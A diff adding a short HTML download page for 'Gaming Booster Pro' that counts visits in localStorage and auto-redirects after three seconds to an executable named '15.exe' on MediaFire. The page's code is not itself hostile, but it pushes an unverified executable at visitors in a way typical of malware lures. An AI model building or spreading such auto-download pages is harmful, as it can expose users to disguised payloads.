@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Downloading - Gaming Booster Pro</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="style.css">
+<script>
+    window.onload = function() {
+
+        let count = localStorage.getItem("downloads");
+        count = count ? parseInt(count) + 1 : 1;
+        localStorage.setItem("downloads", count);
+
+        setTimeout(function(){
+            window.location.href = "https://www.mediafire.com/file/qdx3nqbn4zkiwum/15.exe/file";
+        }, 3000);
+    };
+</script>
+</head>
+<body>
+
+<div class="download-page">
+    <h1>Preparing Your Download...</h1>
+    <p>Your download will start automatically in 3 seconds.</p>
+    <p>If it doesn't start, <a href="https://www.mediafire.com/file/qdx3nqbn4zkiwum/15.exe/file">Click Here</a></p>
+</div>
+
+</body>
+</html>
